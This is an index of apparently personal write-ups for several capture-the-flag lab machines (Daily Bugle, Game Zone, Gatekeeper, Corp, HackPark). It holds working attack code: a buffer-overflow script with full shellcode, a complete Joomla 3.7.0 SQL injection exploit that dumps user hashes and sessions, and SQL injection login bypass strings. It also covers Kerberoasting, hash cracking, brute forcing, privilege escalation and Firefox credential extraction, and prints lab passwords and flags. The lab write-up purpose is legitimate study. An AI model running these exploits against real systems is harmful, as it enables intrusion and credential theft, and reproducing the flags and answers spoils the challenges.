\"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xba\\xc4\\xc5\\xd3\\x40\\xda\\xde\\xd9\\x74\\x24\\xf4\\x5d\\x2b\\xc9\\xb1\"\n\"\\x52\\x83\\xed\\xfc\\x31\\x55\\x0e\\x03\\x91\\xcb\\x31\\xb5\\xe5\\x3c\\x37\"\n\"\\x36\\x15\\xbd\\x58\\xbe\\xf0\\x8c\\x58\\xa4\\x71\\xbe\\x68\\xae\\xd7\\x33\"\n\"\\x02\\xe2\\xc3\\xc0\\x66\\x2b\\xe4\\x61\\xcc\\x0d\\xcb\\x72\\x7d\\x6d\\x4a\"\n\"\\xf1\\x7c\\xa2\\xac\\xc8\\x4e\\xb7\\xad\\x0d\\xb2\\x3a\\xff\\xc6\\xb8\\xe9\"\n\"\\xef\\x63\\xf4\\x31\\x84\\x38\\x18\\x32\\x79\\x88\\x1b\\x13\\x2c\\x82\\x45\"\n\"\\xb3\\xcf\\x47\\xfe\\xfa\\xd7\\x84\\x3b\\xb4\\x6c\\x7e\\xb7\\x47\\xa4\\x4e\"\n\"\\x38\\xeb\\x89\\x7e\\xcb\\xf5\\xce\\xb9\\x34\\x80\\x26\\xba\\xc9\\x93\\xfd\"\n\"\\xc0\\x15\\x11\\xe5\\x63\\xdd\\x81\\xc1\\x92\\x32\\x57\\x82\\x99\\xff\\x13\"\n\"\\xcc\\xbd\\xfe\\xf0\\x67\\xb9\\x8b\\xf6\\xa7\\x4b\\xcf\\xdc\\x63\\x17\\x8b\"\n\"\\x7d\\x32\\xfd\\x7a\\x81\\x24\\x5e\\x22\\x27\\x2f\\x73\\x37\\x5a\\x72\\x1c\"\n\"\\xf4\\x57\\x8c\\xdc\\x92\\xe0\\xff\\xee\\x3d\\x5b\\x97\\x42\\xb5\\x45\\x60\"\n\"\\xa4\\xec\\x32\\xfe\\x5b\\x0f\\x43\\xd7\\x9f\\x5b\\x13\\x4f\\x09\\xe4\\xf8\"\n\"\\x8f\\xb6\\x31\\xae\\xdf\\x18\\xea\\x0f\\x8f\\xd8\\x5a\\xf8\\xc5\\xd6\\x85\"\n\"\\x18\\xe6\\x3c\\xae\\xb3\\x1d\\xd7\\xdb\\x52\\x19\\xf7\\xb4\\x56\\x21\\xd4\"\n\"\\x6d\\xde\\xc7\\x70\\x7e\\xb6\\x50\\xed\\xe7\\x93\\x2a\\x8c\\xe8\\x09\\x57\"\n\"\\x8e\\x63\\xbe\\xa8\\x41\\x84\\xcb\\xba\\x36\\x64\\x86\\xe0\\x91\\x7b\\x3c\"\n\"\\x8c\\x7e\\xe9\\xdb\\x4c\\x08\\x12\\x74\\x1b\\x5d\\xe4\\x8d\\xc9\\x73\\x5f\"\n\"\\x24\\xef\\x89\\x39\\x0f\\xab\\x55\\xfa\\x8e\\x32\\x1b\\x46\\xb5\\x24\\xe5\"\n\"\\x47\\xf1\\x10\\xb9\\x11\\xaf\\xce\\x7f\\xc8\\x01\\xb8\\x29\\xa7\\xcb\\x2c\"\n\"\\xaf\\x8b\\xcb\\x2a\\xb0\\xc1\\xbd\\xd2\\x01\\xbc\\xfb\\xed\\xae\\x28\\x0c\"\n\"\\x96\\xd2\\xc8\\xf3\\x4d\\x57\\xe8\\x11\\x47\\xa2\\x81\\x8f\\x02\\x0f\\xcc\"\n\"\\x2f\\xf9\\x4c\\xe9\\xb3\\x0b\\x2d\\x0e\\xab\\x7e\\x28\\x4a\\x6b\\x93\\x40\"\n\"\\xc3\\x1e\\x93\\xf7\\xe4\\x0a\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Corp/corp/","title":"Corp","text":"<p><code>Invoke-Kerberoast -OutputFormat hashcat</code></p> <p></p> <p>cracking the hash</p> <p></p> <p>2nd user: <code>fela:rubenF124</code></p> <p></p> <p><code>xfreerdp /u:'corp\\fela' /p:rubenF124 /v:10.10.107.196</code></p> <p></p> <p><code>type C:\\Windows\\Panther\\Unattend\\Unattended.xml</code></p> <p></p> <p><code>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</code></p> <p><code>xfreerdp /u:'corp\\Administrator' /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.107.196</code></p> <p>and after login you have to change the password with the same complexity </p> <p>admin == THM{g00d_j0b_SYS4DM1n_M4s73R}</p> <p></p>"},{"location":"Daily%20Bugle/00-creds/","title":"00 creds","text":"<pre><code>'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']\n</code></pre> <pre><code>jonah:spiderman123\n\njjameson:nv5uz9r3ZEDzVjNu\n</code></pre>"},{"location":"Daily%20Bugle/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.153.244\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 17:57 IST\nNmap scan report for 10.10.153.244\nHost is up (0.13s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)\n|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)\n|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)\n80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n| http-robots.txt: 15 disallowed entries \n| /joomla/administrator/ /administrator/ /bin/ /cache/ \n| /cli/ /components/ /includes/ /installation/ /language/ \n|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40\n|_http-title: Home\n3306/tcp open  mysql   MariaDB (unauthorized)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 62.66 seconds\n</code></pre>"},{"location":"Daily%20Bugle/02-web/","title":"02 web","text":""},{"location":"Daily%20Bugle/02-web/#port-80","title":"port 80","text":"<p>robots.txt </p> <p>http://10.10.153.244/administrator/</p> <p></p>"},{"location":"Daily%20Bugle/02-web/#enumerating","title":"enumerating","text":"<p>its a joomla for this use joomscan (apt install joomscan)</p> <p></p>"},{"location":"Daily%20Bugle/03-foothold/","title":"03 foothold","text":"<p>joomla 3.7.0</p> <p>CVE 2017-8917</p> <p>https://www.exploit-db.com/exploits/42033</p> <p>https://github.com/stefanlucas/Exploit-Joomla</p> <p>Modified exploit</p> <pre><code>#!/usr/bin/python\nfrom __future__ import print_function\nimport requests\nimport sys\nimport re\nimport argparse\nimport os\nimport random\nimport time\nimport binascii\n\n\ndef extract_token(resp):\n    match = re.search(r'name=\"([a-f0-9]{32})\" value=\"1\"', resp.text, re.S)\n    if match is None:\n        print(\" [!] Cannot find CSRF token\")\n        return None\n    return match.group(1)\n\n\ndef parse_options():\n    parser = argparse.ArgumentParser(description='Jooma Exploit')\n    parser.add_argument('url', help='Base URL for Joomla site')\n    return parser.parse_args()\n\n\ndef build_sqli(colname, morequery):\n    return \"(SELECT \" + colname + \" \" + morequery + \")\"\n\ndef joomla_370_sqli_extract(options, sess, token, colname, morequery):\n    sqli = build_sqli(\"LENGTH(\"+colname+\")\", morequery)\n    length = joomla_370_sqli(options, sess, token, sqli)\n    if not length:\n        return None\n    length = int(length)\n    maxbytes = 30\n    offset = 0\n    result = ''\n    while length &gt; offset:\n        sqli = build_sqli(\"HEX(MID(%s,%d,%d))\" % (colname, offset + 1, 16), morequery)\n        value = joomla_370_sqli(options, sess, token, sqli)\n        if not value:\n            print(\" [!] Failed to retrieve string for query:\", sqli)\n            return None\n        value = binascii.unhexlify(value).decode()\n        result += value\n        offset += len(value)\n    return result\n\n\ndef joomla_370_sqli(options, sess, token, sqli):\n    sqli_full = \"UpdateXML(2, concat(0x3a,\" + sqli + \", 0x3a), 1)\"\n    data = {\n        'option': 'com_fields',\n        'view': 'fields',\n        'layout': 'modal',\n        'list[fullordering]': sqli_full,\n        token: '1',\n    }\n    resp = sess.get(options.url + \"/index.php?option=com_fields&amp;view=fields&amp;layout=modal\", params=data, allow_redirects=False)\n    match = re.search(r'XPATH syntax error:\\s*&amp;#039;([^$\\n]+)\\s*&amp;#039;\\s*&lt;/bl', resp.text, re.S)\n    if match:\n        match = match.group(1).strip()\n        if match[0] != ':' and match[-1] != ':':\n            return None\n        return match[1:-1]\n\n\ndef extract_joomla_tables(options, sess, token):\n    tables = list()\n    first = False\n    offset = 0\n    while True:\n        result = joomla_370_sqli_extract(options, sess, token, \"TABLE_NAME\", \"FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT \" + str(offset) + \",1\" )\n        if result is None:\n            if first:\n                print(\"[!] Failed to retrieve first table name!\")\n                return False\n            break\n        tables.append(result)\n        print(\"  -  Found table:\", result)\n        first = False\n        offset += 1\n    return tables\n\n\ndef extract_joomla_users(options, sess, token, table_name):\n    users = list()\n    offset = 0\n    first = False\n    print(\"  -  Extracting users from\", table_name)\n    while True:\n        result = joomla_370_sqli_extract(options, sess, token, \"CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)\", \"FROM %s ORDER BY registerDate ASC LIMIT %d,1\" % (table_name, offset) )     \n        if result is None:\n            if first:\n                print(\"[!] Failed to retrieve user from table!\")\n                return False\n            break\n        result = result.split('|')\n        print(\" [$] Found user\",result)\n        first = False\n        offset += 1\n        users.append(result)\n    return users\n\n\n\n\ndef extract_joomla_sessions(options, sess, token, table_name):\n    sessions = list()\n    offset = 0\n    first = False\n    print(\"  -  Extracting sessions from\", table_name)\n    while True:\n        result = joomla_370_sqli_extract(options, sess, token, \"CONCAT(userid,0x7c,session_id,0x7c,username)\", \"FROM %s WHERE guest = 0 LIMIT %d,1\" % (table_name, offset) )        \n        if result is None:\n            if first:\n                print(\"[!] Failed to retrieve session from table!\")\n                return False\n            break\n        result = result.split('|')\n        print(\" [$] Found session\", result)\n        first = False\n        offset += 1\n        sessions.append(result)\n    return sessions\n\n\n\n\ndef pwn_joomla_again(options):\n    sess = requests.Session()\n\n    print(\" [-] Fetching CSRF token\")\n    resp = sess.get(options.url + \"/index.php/component/users/?view=login\") \n    token = extract_token(resp)\n    if not token:\n        return False\n\n    # Verify that we can perform SQLi\n    print(\" [-] Testing SQLi\")  \n    result = joomla_370_sqli(options, sess, token, \"128+127\")   \n    if result != \"255\":\n        print(\" [!] Could not find SQLi output!\")\n        return False\n\n    tables = extract_joomla_tables(options, sess, token)\n\n    for table_name in tables:\n        table_prefix = table_name[:-5]\n        extract_joomla_users(options, sess, token, table_name)\n        extract_joomla_sessions(options, sess, token, table_prefix + 'session')\n\n    return True\n\ndef print_logo():\n    clear = \"\\x1b[0m\"\n    colors = [31, 32, 33, 34, 35, 36]\n\n    logo = \"\"\"                                                                                                                    \n    .---.    .-'''-.        .-'''-.                                                           \n    |   |   '   _    \\     '   _    \\                            .---.                        \n    '---' /   /` '.   \\  /   /` '.   \\  __  __   ___   /|        |   |            .           \n    .---..   |     \\  ' .   |     \\  ' |  |/  `.'   `. ||        |   |          .'|           \n    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         &lt;  |           \n    |   |\\    \\     / / \\    \\     / / |  |  |  |  |  |||  __    |   |    __    | |           \n    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    \n    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \\ | | |/.'''. \\   \n    |   |                              |  |  |  |  |  |||     | ||   |`\" __ | | |  /    | |   \n    |   |                              |__|  |__|  |__|||\\    / '|   | .'.''| | | |     | |   \n __.'   '                                              |/\\'..' / '---'/ /   | |_| |     | |   \n|      '                                               '  `'-'`       \\ \\._,\\ '/| '.    | '.  \n|____.'                                                                `--'  `\" '---'   '---' \n\"\"\"\n    for line in logo.split(\"\\n\"):\n        sys.stdout.write(\"\\x1b[1;%dm%s%s\\n\" % (random.choice(colors), line, clear))\n        #time.sleep(0.05)\n\ndef main(base_url): \n    options = parse_options()\n    options.url = options.url.rstrip('/')\n    print_logo()\n    pwn_joomla_again(options)\n\nif __name__ == \"__main__\":\n    sys.exit(main(\"http://10.10.153.244/\"))\n</code></pre> <p>and we got the hash</p> <p></p> <pre><code>ound user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']\n\n</code></pre> <p>the hash is bcrypt </p> <p></p> <p>cracking the hash <code>hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt</code></p> <p></p> <p><code>jonah:spiderman123</code></p> <p>use the creds to log in and we are in</p> <p></p> <p>and go to customise a active template and add the php rev shell </p> <p></p> <p></p> <p>or even better edit the error.php file </p> <p></p> <p>save it  </p> <p>go to http://10.10.153.244/templates/beez3/error.php </p> <p>and we got the shell </p> <p></p>"},{"location":"Daily%20Bugle/04-user/","title":"04 user","text":"<p>from the /var/www/html </p> <p>cat configuration.php</p> <p>we got a password</p> <p></p> <p><code>jjameson:nv5uz9r3ZEDzVjNu</code></p> <p>ssh and we got user </p> <p></p> <p>user === 27a260fe3cba712cfdedb1c86d80442e</p>"},{"location":"Daily%20Bugle/05-root/","title":"05 root","text":"<p>sudo -l </p> <p></p> <p>from gtfobins</p> <p>https://gtfobins.github.io/gtfobins/yum/</p> <p>following the steps from Sudo (b) : Spawn interactive root shell by loading a custom plugin.</p> <p>we got root </p> <p>root == eec3d53292b1821868266858d7fa6f79</p>"},{"location":"File-upload%20vulnerabilities/uploadvulns/","title":"Uploadvulns","text":"<p>jewel.uploadvulns.thm</p> <p>web is  in node.js </p> <p>fuzzing</p> <p></p> <p></p> <p>burp config allow the js to intercept  </p> <p>and clear the cache</p> <p>intercept the request  </p> <p></p> <p></p> <p>After uploading re run the go buster scan as the file uploaded gets renamed</p> <p>I have uploaded few file to test so result may differ</p> <p></p> <p>so getting the file name AMV.jpg</p> <p>call the file from admin page </p> <p>we got the flag </p> <p>flag === THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}</p>"},{"location":"Game%20Zone/00-creds/","title":"00 creds","text":"<p><code>' or 1=1 -- -:</code> <code>agent47:videogamer124</code></p>"},{"location":"Game%20Zone/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.65.65  \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 13:40 IST\nNmap scan report for 10.10.65.65\nHost is up (0.13s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)\n|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)\n|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Game Zone\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.97 seconds\n</code></pre>"},{"location":"Game%20Zone/02-web/","title":"02 web","text":""},{"location":"Game%20Zone/02-web/#port-80","title":"port 80","text":"<p>passing <code>' or 1=1 -- -</code> as username and empty password we go to portal.php</p> <p></p>"},{"location":"Game%20Zone/03-exploit/","title":"03 exploit","text":""},{"location":"Game%20Zone/03-exploit/#sql-injection","title":"sql injection","text":"<p>saving the request </p> <p>running sql map <code>sqlmap -r request.txt --dbms=mysql --dump</code></p> <p></p> <p>and we got the dump</p> <p></p> <p>cracking the hash <code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</code></p> <p><code>hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt</code> </p> <p><code>agent47:videogamer124</code></p> <p>ssh and got user</p> <p></p>"},{"location":"Game%20Zone/04-Root/","title":"04 Root","text":"<p>running  <code>netstat -ant</code> or <code>ss -tulpn</code></p> <p></p> <p>port forwarding the port 10000</p> <p></p> <p>using creds <code>agent47:videogamer124</code> we are in</p> <p></p> <p>webadmin  1.580</p>"},{"location":"Game%20Zone/04-Root/#exploit","title":"exploit","text":"<p>https://www.exploit-db.com/exploits/21851</p> <p></p> <p>we got shell  </p> <p></p> <p>root === a4b945830144bdd71908d12d902adeee</p>"},{"location":"Gatekeeper/00-creds/","title":"00 creds","text":"<pre><code>Username: 'mayor'\nPassword: '8CL7O1N78MdrCIsV'\n</code></pre>"},{"location":"Gatekeeper/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.230.241    \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 00:32 IST\nNmap scan report for 10.10.230.241\nHost is up (0.13s latency).\nNot shown: 989 closed ports\nPORT      STATE SERVICE            VERSION\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n3389/tcp  open  ssl/ms-wbt-server?\n| ssl-cert: Subject: commonName=gatekeeper\n| Not valid before: 2021-05-29T19:02:33\n|_Not valid after:  2021-11-28T19:02:33\n|_ssl-date: 2021-05-30T19:05:57+00:00; +1s from scanner time.\n31337/tcp open  Elite?\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0\n|     Hello\n|   GenericLines: \n|     Hello \n|     Hello\n|   GetRequest: \n|     Hello GET / HTTP/1.0\n|     Hello\n|   HTTPOptions: \n|     Hello OPTIONS / HTTP/1.0\n|     Hello\n|   Help: \n|     Hello HELP\n|   Kerberos: \n|     Hello !!!\n|   LDAPSearchReq: \n|     Hello 0\n|     Hello\n|   LPDString: \n|     Hello \n|     default!!!\n|   RTSPRequest: \n|     Hello OPTIONS / RTSP/1.0\n|     Hello\n|   SIPOptions: \n|     Hello OPTIONS sip:nm SIP/2.0\n|     Hello Via: SIP/2.0/TCP nm;branch=foo\n|     Hello From: &lt;sip:nm@nm&gt;;tag=root\n|     Hello To: &lt;sip:nm2@nm2&gt;\n|     Hello Call-ID: 50000\n|     Hello CSeq: 42 OPTIONS\n|     Hello Max-Forwards: 70\n|     Hello Content-Length: 0\n|     Hello Contact: &lt;sip:nm@nm&gt;\n|     Hello Accept: application/sdp\n|     Hello\n|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|_    Hello\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49155/tcp open  msrpc              Microsoft Windows RPC\n49161/tcp open  msrpc              Microsoft Windows RPC\n49167/tcp open  msrpc              Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31337-TCP:V=7.91%I=7%D=5/31%Time=60B3E179%P=x86_64-pc-linux-gnu%r(G\nSF:etRequest,24,\"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\")%r\nSF:(SIPOptions,142,\"Hello\\x20OPTIONS\\x20sip:nm\\x20SIP/2\\.0\\r!!!\\nHello\\x20\nSF:Via:\\x20SIP/2\\.0/TCP\\x20nm;branch=foo\\r!!!\\nHello\\x20From:\\x20&lt;sip:nm@n\nSF:m&gt;;tag=root\\r!!!\\nHello\\x20To:\\x20&lt;sip:nm2@nm2&gt;\\r!!!\\nHello\\x20Call-ID:\nSF:\\x2050000\\r!!!\\nHello\\x20CSeq:\\x2042\\x20OPTIONS\\r!!!\\nHello\\x20Max-Forw\nSF:ards:\\x2070\\r!!!\\nHello\\x20Content-Length:\\x200\\r!!!\\nHello\\x20Contact:\nSF:\\x20&lt;sip:nm@nm&gt;\\r!!!\\nHello\\x20Accept:\\x20application/sdp\\r!!!\\nHello\\x\nSF:20\\r!!!\\n\")%r(GenericLines,16,\"Hello\\x20\\r!!!\\nHello\\x20\\r!!!\\n\")%r(HTT\nSF:POptions,28,\"Hello\\x20OPTIONS\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\"\nSF:)%r(RTSPRequest,28,\"Hello\\x20OPTIONS\\x20/\\x20RTSP/1\\.0\\r!!!\\nHello\\x20\\\nSF:r!!!\\n\")%r(Help,F,\"Hello\\x20HELP\\r!!!\\n\")%r(SSLSessionReq,C,\"Hello\\x20\\\nSF:x16\\x03!!!\\n\")%r(TerminalServerCookie,B,\"Hello\\x20\\x03!!!\\n\")%r(TLSSess\nSF:ionReq,C,\"Hello\\x20\\x16\\x03!!!\\n\")%r(Kerberos,A,\"Hello\\x20!!!\\n\")%r(Fou\nSF:rOhFourRequest,47,\"Hello\\x20GET\\x20/nice%20ports%2C/Tri%6Eity\\.txt%2eba\nSF:k\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\")%r(LPDString,12,\"Hello\\x20\\x01de\nSF:fault!!!\\n\")%r(LDAPSearchReq,17,\"Hello\\x200\\x84!!!\\nHello\\x20\\x01!!!\\n\"\nSF:);\nService Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s\n|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:63:c9:00:51:c3 (unknown)\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: gatekeeper\n|   NetBIOS computer name: GATEKEEPER\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-05-30T15:05:51-04:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-30T19:05:51\n|_  start_date: 2021-05-30T19:02:19\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 181.43 seconds\n</code></pre>"},{"location":"Gatekeeper/02-smb/","title":"02 smb","text":""},{"location":"Gatekeeper/03-foothold/","title":"03 foothold","text":"<p>port 31337 is used for connection/interacting with the binary</p> <p></p>"},{"location":"Gatekeeper/03-foothold/#fuzzing","title":"fuzzing","text":"<p>crashed in 200 bytes </p> <pre><code>#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"192.168.1.108\"\n\nport = 31337\ntimeout = 5\nprefix = \"\"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      # s.recv(1024)\n      #s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string + \"\\r\\n\", \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n</code></pre>"},{"location":"Gatekeeper/03-foothold/#offset","title":"offset","text":"<p>EIP: 39654138 offset: 146 </p> <p></p>"},{"location":"Gatekeeper/03-foothold/#bad-chars","title":"bad chars","text":"<p><code>!mona config -set workingfolder C:\\mona</code></p> <p><code>!mona bytearray -b \"\\x00\"</code></p> <p>bad chars <code>\\x00\\x0a</code> </p>"},{"location":"Gatekeeper/03-foothold/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -epb -b \"\\x00\\x0a\"</code></p> <p>080414C3</p> <p>little endian: <code>\\xc3\\x14\\x04\\x08</code></p> <p></p>"},{"location":"Gatekeeper/03-foothold/#exploit","title":"exploit","text":"<p>user === {H4lf_W4y_Th3r3}</p>"},{"location":"Gatekeeper/04-root/","title":"04 root","text":"<p>in the desktop itself there is Firefox shortcut</p> <p></p> <p>upgraded the shell to meterpreter</p> <p>and there might be some more info we can get from firefox.</p> <p><code>C:\\users\\natbat\\AppData\\roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release</code></p> <p>we got the files including key4.db</p> <p>get the files <code>cert9.db  cookies.sqlite  key4.db  logins.json</code></p> <p>and crack using https://github.com/unode/firefox_decrypt</p> <p></p> <pre><code>Username: 'mayor'\nPassword: '8CL7O1N78MdrCIsV'\n</code></pre> <p>using <code>impacket-psexec</code> to login</p> <p></p> <p></p> <p>root === {Th3_M4y0r_C0ngr4tul4t3s_U}</p>"},{"location":"HackPark/00-creds/","title":"00 creds","text":""},{"location":"HackPark/00-creds/#web","title":"web","text":"<pre><code> admin:1qaz2wsx\n</code></pre>"},{"location":"HackPark/01-nmap/","title":"01 nmap","text":"<pre><code>\u2500$ nmap -sC -sV -oN nmap 10.10.201.122\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 18:03 IST\nNmap scan report for 10.10.201.122\nHost is up (0.14s latency).\nNot shown: 998 filtered ports\nPORT     STATE SERVICE            VERSION\n80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| http-methods: \n|_  Potentially risky methods: TRACE\n| http-robots.txt: 6 disallowed entries \n| /Account/*.* /search /search.aspx /error404.aspx \n|_/archive /archive.aspx\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: hackpark | hackpark amusements\n3389/tcp open  ssl/ms-wbt-server?\n| ssl-cert: Subject: commonName=hackpark\n| Not valid before: 2021-05-26T12:31:05\n|_Not valid after:  2021-11-25T12:31:05\n|_ssl-date: 2021-05-27T12:33:33+00:00; 0s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.24 seconds\n</code></pre>"},{"location":"HackPark/02-web/","title":"02 web","text":""},{"location":"HackPark/02-web/#port-80","title":"port 80","text":""},{"location":"HackPark/02-web/#brute-force-attack","title":"brute force attack","text":"<p>intersecpting the post request </p> <p></p> <pre><code>__VIEWSTATE=1jT%2FeKIquWyJY0kSi8eRWohPxvCGdIIZV74C%2BT%2FZf%2Fb94iWqLDuDKsAtaU2zqX2ysa3nlvkLNu5CyGGAPm2PrKhw8v5yl2lA341dkBu6H71fKkVzJ8%2FF%2Fyd4yBPApWjOgRWMPCdeFcpAgpSKjjJ%2BEIVAL%2BMA%2Bd7gLa5hAI2iI1YpPSmwsjbk9LKSdnHMNek1VcNk4%2B2vuhswUwqhJGDcpg657X27UE0QPvhqFh7fjdmblWSCjMQWlCc0Hr7ijgm7UaflAa4Z91EiFcr%2B6ZdXfOQLMsUqjXihripRyLnT6TANeBnInJOGL%2BGffW6cydxDv76xll19RWNGx9qLY%2FPCUZZGTwr1rdBjAtHY5QSRy%2BVeL5hy&amp;__EVENTVALIDATION=pWIL9Mp6tOVGVfPCpIjlfvYXtZFShT9iBDKzsaWtjZY9tSRTTIiphJpDTaqXM5Fak4fRWpsH9qIjGI4hrr42hGkPMJ%2BDK%2BUprfMQc6byfqWjLH428ei9KNuD%2FoxibJwoLskM4RdCwU96Mka6jG7rTUBiwpTHXVOxeMgH5a7dgek%2FjIGM&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=pass&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in\n</code></pre> <p>so for hydra </p> <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.201.122 http-post-form 